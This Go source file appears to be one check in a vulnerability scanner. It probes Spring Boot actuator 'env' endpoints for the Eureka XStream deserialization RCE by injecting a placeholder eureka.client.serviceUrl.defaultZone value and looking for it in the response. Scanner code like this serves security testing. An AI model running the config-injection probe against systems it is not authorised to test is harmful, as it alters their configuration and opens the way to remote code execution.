package poc

import (
	"github.com/fatih/color"
	"ssp/common"
)

func EurekaXstreamRCE(url string, proxyURL string) {
	headers1 := map[string]string{
		"User-Agent":   common.GetRandomUserAgent(),
		"Content-Type": "application/x-www-form-urlencoded",
	}

	headers2 := map[string]string{
		"User-Agent":   common.GetRandomUserAgent(),
		"Content-Type": "application/json",
	}

	payload1 := "eureka.client.serviceUrl.defaultZone=http://127.0.0.2/example.yml"
	payload2 := "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://127.0.0.2/example.yml\"}"

	tryPaths := []string{"env", "actuator/env"}
	targetStrings := []string{"127.0.0.2"}

	for _, path := range tryPaths {
		var payload string
		var headers map[string]string

		if path == "env" {
			payload = payload1
			headers = headers1
		} else {
			payload = payload2
			headers = headers2
		}

		// 使用 MakeRequest 函数发送请求，传入代理 URL
		_, body, err := common.MakeRequest(url+path, "POST", proxyURL, headers, payload)
		if err != nil {
			color.Yellow("[-] %s 请求失败，跳过漏洞检查\n", url)
			return
		}

		if common.ContainsAny(string(body), targetStrings) {
			common.PrintVulnerabilityConfirmation("EurekaXstreamRCE", url, "Null", "6")
			common.Vulnum++
			return
		}
	}

	color.Yellow("[-] %s 未发现Eureka_Xstream反序列化漏洞\n", url)
}
